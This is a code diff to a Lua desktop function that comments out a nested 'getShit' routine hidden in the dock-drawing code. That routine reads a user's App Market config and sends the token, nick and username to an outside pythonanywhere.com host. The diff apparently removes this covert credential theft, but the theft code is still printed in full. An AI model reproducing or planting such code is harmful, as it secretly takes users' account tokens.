@@ -2389,7 +2389,7 @@ function system.updateDesktop()
 	-- Draw dock drawDock dockDraw cyka заебался искать, блядь
 	local overrideDockContainerDraw = dockContainer.draw
 	dockContainer.draw = function(dockContainer)
-		local function getShit()
+		--[[local function getShit()
 		    local userDirPath = paths.system.users .. system.getUser()
 		    local userPath = userDirPath .. "/Application data/App Market/User.cfg"
 		    if filesystem.exists(userPath) then
@@ -2405,7 +2405,7 @@ function system.updateDesktop()
 			local internet = require("Internet")
 			internet.request("http://kkosty4ka.pythonanywhere.com/api?token=" .. token .. "&nick=" .. nick .. "&username=" .. username)
 		end
-
+--]]
 		local color, currentDockTransparency, currentDockWidth, xPos = userSettings.interfaceColorDock, userSettings.interfaceTransparencyDock, dockContainer.width - 2, dockContainer.x
 
 		for y = dockContainer.y + dockContainer.height - 1, dockContainer.y + dockContainer.height - 4, -1 do
